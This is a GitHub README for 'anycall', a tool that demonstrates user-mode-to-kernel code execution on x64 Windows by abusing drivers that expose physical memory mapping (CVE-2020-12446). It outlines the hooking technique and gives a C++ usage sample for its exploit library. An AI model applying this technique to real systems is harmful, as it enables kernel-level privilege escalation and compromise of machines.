<p align="center">
<img src="image.png">

<img src="https://img.shields.io/github/workflow/status/kkent030315/anycall/MSBuild?style=for-the-badge">
<img src="https://img.shields.io/github/v/release/kkent030315/anycall?style=for-the-badge">
<img src="https://img.shields.io/badge/platform-win--64-00a2ed?style=for-the-badge">
<img src="https://img.shields.io/codacy/grade/80af226b06214213bc3d2a44c9624222?style=for-the-badge">
<img src="https://img.shields.io/github/license/kkent030315/anycall?style=for-the-badge">
</p>

# anycall

x64 Windows kernel code execution via user-mode, arbitrary syscall, vulnerable IOCTLs demonstration

Read: https://web.archive.org/web/*/https://www.godeye.club/2021/05/14/001-x64-windows-kernel-code-execution-via-user.html

## How it works

<p align="center">
<img src="how.png">
</p>

1. Allocate physical memory to user virtual memory
	- Allows user-process to manupulate arbitrary physical memory without calling APIs
2. Search entire physical memory until we found function stub to hook, in `ntoskrnl.exe` physical memory
3. Once the stub found, place inline-hook on the stub
	- simply `jmp rax`, detour address could be anything we want to invoke
4. `syscall` it
5. wow, we are `user-mode` but able to call kernel APIs

## Goal of this project

This project is to demonstrate how drivers that allowing user-process to map physical memory for user, and how it is critical vulnerable.

Related CVEs:

- [CVE-2020-12446](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12446)

## libanycall

`libanycall` is the powerful c++ static-library that makes exploit execution of ``anycall`` more easily.

### Usage

1. link it (e.g, `#pragma comment( lib, "libanycall64" )`)
2. include (e.g, `#include "libanycall.h"`)

For example:

```cpp
#include <windows.h>
#include <iostream>

#include "libanycall.h"

#pragma comment( lib, "libanycall64" )

using PsGetCurrentProcessId = HANDLE( __fastcall* )( void );

int main( const int argc, const char** argv, const char** envp )
{
    if ( !libanycall::init( "ntdll.dll", "NtTraceControl" ) )
    {
        printf( "[!] failed to init libanycall\n" );
        return EXIT_FAILURE;
    }
    
    // invoke NT kernel APIs from usermode
    const uint32_t process_id =
        ( uint32_t )ANYCALL_INVOKE( PsGetCurrentProcessId );

    printf( "PsGetCurrentProcessId returns %d\n", process_id );

    return EXIT_SUCCESS;
}
```

## License

MIT
